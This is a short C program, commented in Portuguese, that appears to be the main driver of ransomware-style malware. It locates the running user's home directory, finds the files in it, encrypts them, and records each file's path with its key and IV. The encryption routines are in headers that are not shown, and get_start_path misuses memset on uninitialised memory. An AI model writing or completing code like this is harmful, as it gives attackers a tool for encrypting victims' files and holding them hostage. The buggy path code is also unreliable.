#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<unistd.h>
#include"lib/func.h"
#include"lib/struct.h"

/*
 * JSON
 * {"path":"/home/tarcisio/arquivo.enc", "key":"chave de criptografia", "iv":"vetor de inicializacao"}
 */
char * get_start_path();

int main(){
    List *files = NULL;
    EncList *encrypted = NULL;
    List *not_encrypted = NULL;
    char* start_path = get_start_path();
    
    find_files(&files, start_path);
    encrypt_files(files, &encrypted, &not_encrypted);
    save_into_file_encrypted_list(encrypted, start_path);
    //read_from_file_encrypted_files(&encrypted, start_path);
    //destroy(&files);
    //destroy_encrypted_list(&encrypted);
    //free(key); // muito importante desalocar a senha kkkkk
    
    return 0;
}

char * get_start_path(){
    char* start_path;
    char username[100];
    getlogin_r(username, 100);
    start_path = (char *)malloc(strlen("/home/") + strlen(username) + 3);
    memset(start_path, 0, strlen(start_path));
    strcat(start_path, "/home/");
    strcat(start_path, username);
    strcat(start_path, "/");
    return start_path;
}